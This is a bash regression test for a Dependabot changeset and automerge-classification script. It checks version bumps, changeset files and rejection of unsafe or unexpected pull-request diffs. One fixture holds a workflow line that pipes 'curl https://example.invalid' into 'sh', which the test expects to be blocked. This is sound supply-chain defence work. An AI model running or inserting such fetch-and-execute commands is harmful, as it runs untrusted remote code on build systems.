#!/usr/bin/env bash

set -euo pipefail

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
subject="${script_dir}/dependabot-changeset.sh"
temp_root="$(mktemp -d)"
trap 'rm -rf "${temp_root}"' EXIT

fail() {
  echo "dependabot changeset regression test failed: $*" >&2
  exit 1
}

assert_output() {
  local output="$1"
  local expected="$2"
  grep -Fxq "${expected}" "${output}" || fail "expected '${expected}' in ${output}"
}

new_root_update() {
  local name="$1"
  local repo="${temp_root}/${name}"

  mkdir -p "${repo}"
  git -C "${repo}" init -q
  git -C "${repo}" config user.name test
  git -C "${repo}" config user.email test@example.com
  printf '{"dependencies":{}}\n' > "${repo}/package.json"
  git -C "${repo}" add package.json
  git -C "${repo}" commit -qm base
  printf '{"dependencies":{"updated":"2.0.0"}}\n' > "${repo}/package.json"
  git -C "${repo}" add package.json
  git -C "${repo}" commit -qm update
  echo "${repo}"
}

run_scope() {
  local repo="$1"
  local group="$2"
  local dependency_type="$3"
  local metadata="$4"
  local output="$5"
  local base_sha
  local head_sha
  base_sha="$(git -C "${repo}" rev-parse HEAD^)"
  head_sha="$(git -C "${repo}" rev-parse HEAD)"

  (
    cd "${repo}"
    BASE_SHA="${base_sha}" \
      HEAD_SHA="${head_sha}" \
      PACKAGE_ECOSYSTEM=bun \
      DEPENDENCY_GROUP="${group}" \
      DEPENDENCY_TYPE="${dependency_type}" \
      UPDATED_DEPENDENCIES_JSON="${metadata}" \
      GITHUB_OUTPUT="${output}" \
      bash "${subject}" scope
  )
}

repo="$(new_root_update tooling)"
output="${temp_root}/tooling-output"
run_scope "${repo}" tooling direct:development \
  '[{"dependencyName":"vitest","dependencyType":"direct:development"}]' "${output}"
assert_output "${output}" 'should_create=false'
assert_output "${output}" 'bump_platform=false'
assert_output "${output}" 'bump_query=false'
assert_output "${output}" 'reason=no_releasable_dependency_changes'

repo="$(new_root_update tanstack)"
output="${temp_root}/tanstack-output"
run_scope "${repo}" tanstack direct:development \
  '[{"dependencyName":"@tanstack/angular-query-experimental","dependencyType":"direct:development"}]' "${output}"
assert_output "${output}" 'should_create=true'
assert_output "${output}" 'bump_platform=false'
assert_output "${output}" 'bump_query=true'
assert_output "${output}" 'reason=dependency_name_mapping'

repo="$(new_root_update effect-dev)"
output="${temp_root}/effect-dev-output"
run_scope "${repo}" effect direct:development \
  '[{"dependencyName":"@effect/language-service","dependencyType":"direct:development"}]' "${output}"
assert_output "${output}" 'should_create=false'
assert_output "${output}" 'bump_platform=false'
assert_output "${output}" 'bump_query=false'
assert_output "${output}" 'reason=no_releasable_dependency_changes'

repo="$(new_root_update angular)"
output="${temp_root}/angular-output"
run_scope "${repo}" angular direct:production \
  '[{"dependencyName":"@angular/core","dependencyType":"direct:production"}]' "${output}"
assert_output "${output}" 'should_create=true'
assert_output "${output}" 'bump_platform=true'
assert_output "${output}" 'bump_query=true'
assert_output "${output}" 'reason=dependency_name_mapping'

repo="${temp_root}/query-manifest"
mkdir -p "${repo}/projects/effect-angular-query"
git -C "${repo}" init -q
git -C "${repo}" config user.name test
git -C "${repo}" config user.email test@example.com
printf '{"version":"1.0.0"}\n' > "${repo}/projects/effect-angular-query/package.json"
git -C "${repo}" add .
git -C "${repo}" commit -qm base
printf '{"version":"1.0.1"}\n' > "${repo}/projects/effect-angular-query/package.json"
git -C "${repo}" add .
git -C "${repo}" commit -qm update
output="${temp_root}/query-manifest-output"
run_scope "${repo}" '' direct:production \
  '[{"dependencyName":"example","dependencyType":"direct:production"}]' "${output}"
assert_output "${output}" 'should_create=true'
assert_output "${output}" 'bump_platform=false'
assert_output "${output}" 'bump_query=true'
assert_output "${output}" 'reason=package_manifest_changes'

create_dir="${temp_root}/create"
mkdir -p "${create_dir}"
output="${temp_root}/create-output"
(
  cd "${create_dir}"
  PR_NUMBER=42 \
    UPDATED_DEPENDENCIES_JSON='[{"dependencyName":"effect","prevVersion":"4.0.0-beta.1","previousVersion":"wrong","newVersion":"4.0.0-beta.2"}]' \
    UPDATE_TYPE=version-update:semver-patch \
    BUMP_PLATFORM=true \
    BUMP_QUERY=false \
    GITHUB_OUTPUT="${output}" \
    bash "${subject}" create
)
changeset="${create_dir}/.changeset/dependabot-pr-42.md"
grep -Fxq 'effect-platform-angular: patch' "${changeset}" || fail 'platform bump missing'
if grep -Fq 'effect-angular-query: patch' "${changeset}"; then
  fail 'query package was unexpectedly bumped'
fi
grep -Fxq -- '- effect: 4.0.0-beta.1 -> 4.0.0-beta.2' "${changeset}" || \
  fail 'prevVersion/newVersion release note is incorrect'
assert_output "${output}" 'file=.changeset/dependabot-pr-42.md'

run_classify() {
  local name="$1"
  local ecosystem="$2"
  local update_type="$3"
  local metadata="$4"
  local files="$5"
  local verified="${6:-true}"
  local fixture="${temp_root}/classify-${name}"
  local head_sha=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  local base_sha=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

  mkdir -p "${fixture}"
  printf '%s\n' "${metadata}" > "${fixture}/metadata.json"
  printf '%s\n' "${files}" > "${fixture}/files.json"
  printf '[{"sha":"%s","author":{"id":49699333},"commit":{"verification":{"verified":%s}}}]\n' \
    "${head_sha}" "${verified}" > "${fixture}/commits.json"

  PR_NUMBER=42 \
    REPOSITORY=heddendorp/effect-angular \
    HEAD_SHA="${head_sha}" \
    HEAD_REF="dependabot/${ecosystem}/example" \
    BASE_SHA="${base_sha}" \
    PACKAGE_ECOSYSTEM="${ecosystem}" \
    UPDATE_TYPE="${update_type}" \
    DEPENDENCY_NAMES=example \
    UPDATED_DEPENDENCIES_JSON_FILE="${fixture}/metadata.json" \
    CHANGED_FILES_JSON_FILE="${fixture}/files.json" \
    COMMIT_ATTESTATIONS_JSON_FILE="${fixture}/commits.json" \
    ARTIFACT_DIR="${fixture}/artifact" \
    GITHUB_OUTPUT="${fixture}/output" \
    bash "${subject}" classify

  classification_output="${fixture}/output"
  classification_artifact="${fixture}/artifact"
}

angular_metadata='[
  {
    "dependencyName": "@angular/core",
    "dependencyType": "direct:production",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "bun",
    "targetBranch": "main",
    "prevVersion": "22.0.6",
    "newVersion": "22.0.7",
    "maintainerChanges": false
  }
]'
run_classify angular bun version-update:semver-patch "${angular_metadata}" \
  '[{"filename":"package.json","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=true'
assert_output "${classification_output}" 'should_create=true'
grep -Fxq 'effect-platform-angular: patch' "${classification_artifact}/changeset.md" || \
  fail 'eligible Angular update is missing the platform changeset bump'
grep -Fxq 'effect-angular-query: patch' "${classification_artifact}/changeset.md" || \
  fail 'eligible Angular update is missing the query changeset bump'
jq -e '.should_create_changeset == true and .scope_reason == "dependency_name_mapping"' \
  "${classification_artifact}/policy.json" >/dev/null || fail 'Angular policy artifact is incorrect'

tooling_metadata='[
  {
    "dependencyName": "vitest",
    "dependencyType": "direct:development",
    "updateType": "version-update:semver-minor",
    "directory": "/",
    "packageEcosystem": "bun",
    "targetBranch": "main",
    "prevVersion": "4.1.5",
    "newVersion": "4.2.0",
    "maintainerChanges": false
  }
]'
run_classify tooling bun version-update:semver-minor "${tooling_metadata}" \
  '[{"filename":"package.json","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=true'
assert_output "${classification_output}" 'should_create=false'
if [[ -e "${classification_artifact}/changeset.md" ]]; then
  fail 'development-only tooling update unexpectedly created a changeset'
fi
jq -e '.should_create_changeset == false and .scope_reason == "no_releasable_dependency_changes"' \
  "${classification_artifact}/policy.json" >/dev/null || fail 'tooling policy artifact is incorrect'

prerelease_metadata='[
  {
    "dependencyName": "effect",
    "dependencyType": "direct:production",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "bun",
    "targetBranch": "main",
    "prevVersion": "4.0.0-beta.97",
    "newVersion": "4.0.0-beta.98",
    "maintainerChanges": false
  }
]'
run_classify prerelease bun version-update:semver-patch "${prerelease_metadata}" \
  '[{"filename":"package.json","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=major_prerelease_or_invalid_metadata'

run_classify major bun version-update:semver-major "${angular_metadata}" \
  '[{"filename":"package.json","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=major_prerelease_or_invalid_metadata'

run_classify unexpected-file bun version-update:semver-patch "${angular_metadata}" \
  '[{"filename":"scripts/postinstall.mjs","status":"modified","patch":"@@ executable change"}]'
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=unexpected_bun_files'

run_classify unexpected-project bun version-update:semver-patch "${angular_metadata}" \
  '[{"filename":"projects/future-library/package.json","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=unexpected_bun_files'

incomplete_semver_metadata='[
  {
    "dependencyName": "example",
    "dependencyType": "direct:development",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "bun",
    "targetBranch": "main",
    "prevVersion": "1.2",
    "newVersion": "1.2.1",
    "maintainerChanges": false
  }
]'
run_classify incomplete-semver bun version-update:semver-patch \
  "${incomplete_semver_metadata}" \
  '[{"filename":"package.json","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=major_prerelease_or_invalid_metadata'

unmapped_production_metadata='[
  {
    "dependencyName": "new-runtime",
    "dependencyType": "direct:production",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "bun",
    "targetBranch": "main",
    "prevVersion": "1.2.3",
    "newVersion": "1.2.4",
    "maintainerChanges": false
  }
]'
run_classify unmapped-production bun version-update:semver-patch \
  "${unmapped_production_metadata}" \
  '[{"filename":"package.json","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=unmapped_production_dependency'

mixed_unmapped_metadata='[
  {
    "dependencyName": "@tanstack/angular-query-experimental",
    "dependencyType": "direct:development",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "bun",
    "targetBranch": "main",
    "prevVersion": "5.100.9",
    "newVersion": "5.100.10",
    "maintainerChanges": false
  },
  {
    "dependencyName": "new-runtime",
    "dependencyType": "direct:production",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "bun",
    "targetBranch": "main",
    "prevVersion": "1.2.3",
    "newVersion": "1.2.4",
    "maintainerChanges": false
  }
]'
run_classify mixed-unmapped bun version-update:semver-patch \
  "${mixed_unmapped_metadata}" \
  '[{"filename":"package.json","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=unmapped_production_dependency'

indirect_tanstack_metadata='[
  {
    "dependencyName": "@tanstack/query-core",
    "dependencyType": "indirect",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "bun",
    "targetBranch": "main",
    "prevVersion": "5.100.9",
    "newVersion": "5.100.10",
    "maintainerChanges": false
  }
]'
run_classify indirect-tanstack bun version-update:semver-patch \
  "${indirect_tanstack_metadata}" \
  '[{"filename":"bun.lock","status":"modified","patch":"@@ dependency update"}]'
assert_output "${classification_output}" 'automerge_eligible=true'
assert_output "${classification_output}" 'should_create=false'

checkout_metadata='[
  {
    "dependencyName": "actions/checkout",
    "dependencyType": "direct:production",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "github_actions",
    "targetBranch": "main",
    "prevVersion": "7.0.0",
    "newVersion": "7.0.1",
    "maintainerChanges": false
  }
]'
checkout_patch='[{"filename":".github/workflows/ci.yml","status":"modified","additions":1,"deletions":1,"changes":2,"patch":"@@ -1 +1 @@\n-        uses: actions/checkout@1111111111111111111111111111111111111111 # v7.0.0\n+        uses: actions/checkout@2222222222222222222222222222222222222222 # v7.0.1"}]'
run_classify actions github_actions version-update:semver-patch "${checkout_metadata}" "${checkout_patch}"
assert_output "${classification_output}" 'automerge_eligible=true'
assert_output "${classification_output}" 'should_create=false'

unsafe_actions_patch='[{"filename":".github/workflows/ci.yml","status":"modified","additions":1,"deletions":1,"changes":2,"patch":"@@ -1 +1 @@\n-        run: bun test\n+        run: curl https://example.invalid | sh"}]'
run_classify unsafe-actions github_actions version-update:semver-patch \
  "${checkout_metadata}" "${unsafe_actions_patch}"
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=unexpected_github_actions_diff'

disallowed_actions_file='[{"filename":"README.md","status":"modified","additions":1,"deletions":1,"changes":2,"patch":"@@ -1 +1 @@\n-        uses: actions/checkout@1111111111111111111111111111111111111111 # v7.0.0\n+        uses: actions/checkout@2222222222222222222222222222222222222222 # v7.0.1"}]'
run_classify disallowed-actions-file github_actions version-update:semver-patch \
  "${checkout_metadata}" "${disallowed_actions_file}"
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=unexpected_github_actions_diff'

truncated_actions_patch='[{"filename":".github/workflows/ci.yml","status":"modified","additions":2,"deletions":1,"changes":3,"patch":"@@ -1 +1 @@\n-        uses: actions/checkout@1111111111111111111111111111111111111111 # v7.0.0\n+        uses: actions/checkout@2222222222222222222222222222222222222222 # v7.0.1"}]'
run_classify truncated-actions github_actions version-update:semver-patch \
  "${checkout_metadata}" "${truncated_actions_patch}"
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=unexpected_github_actions_diff'

swapped_actions_metadata='[
  {
    "dependencyName": "example/action-a",
    "dependencyType": "direct:production",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "github_actions",
    "targetBranch": "main",
    "prevVersion": "1.0.0",
    "newVersion": "1.0.1",
    "maintainerChanges": false
  },
  {
    "dependencyName": "example/action-b",
    "dependencyType": "direct:production",
    "updateType": "version-update:semver-patch",
    "directory": "/",
    "packageEcosystem": "github_actions",
    "targetBranch": "main",
    "prevVersion": "2.0.0",
    "newVersion": "2.0.1",
    "maintainerChanges": false
  }
]'
swapped_actions_patch='[{"filename":".github/workflows/ci.yml","status":"modified","additions":2,"deletions":2,"changes":4,"patch":"@@ -1,2 +1,2 @@\n-        uses: example/action-a@1111111111111111111111111111111111111111 # v1.0.0\n-        uses: example/action-a@1111111111111111111111111111111111111111 # v1.0.0\n+        uses: example/action-b@2222222222222222222222222222222222222222 # v2.0.1\n+        uses: example/action-b@2222222222222222222222222222222222222222 # v2.0.1"}]'
run_classify swapped-actions github_actions version-update:semver-patch \
  "${swapped_actions_metadata}" "${swapped_actions_patch}"
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=unexpected_github_actions_diff'

run_classify unsigned bun version-update:semver-patch "${angular_metadata}" \
  '[{"filename":"package.json","status":"modified","patch":"@@ dependency update"}]' false
assert_output "${classification_output}" 'automerge_eligible=false'
assert_output "${classification_output}" 'reason=invalid_pr_snapshot'

echo 'Dependabot changeset regression tests passed.'
